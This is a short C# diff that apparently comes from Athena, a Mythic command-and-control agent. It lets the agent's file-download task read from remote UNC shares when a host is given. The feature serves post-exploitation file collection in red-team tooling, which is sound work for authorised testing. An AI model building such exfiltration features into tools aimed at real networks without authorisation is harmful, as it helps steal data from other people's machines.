@@ -23,6 +23,13 @@ namespace Athena.Handler.Common.FileSystem
             MythicDownloadJob downloadJob = new MythicDownloadJob(job);
             Dictionary<string, string> par = Misc.ConvertJsonStringToDict(job.task.parameters);
             downloadJob.path = par["file"].Replace("\"", string.Empty);
+            if (par.ContainsKey("host") && !string.IsNullOrEmpty(par["host"]))
+            {
+                if (!par["file"].Contains(":") && !par["file"].StartsWith("\\\\")) //It's not a local path, and it's not already in UNC format
+                {
+                    downloadJob.path = @"\\" + par["host"] + @"\" + par["file"];
+                }
+            }
             downloadJob.total_chunks = await GetTotalChunks(downloadJob);
             downloadJobs.GetOrAdd(job.task.id, downloadJob);
             Debug.WriteLine($"[{DateTime.Now}] Starting download job ({downloadJob.chunk_num}/{downloadJob.total_chunks})");
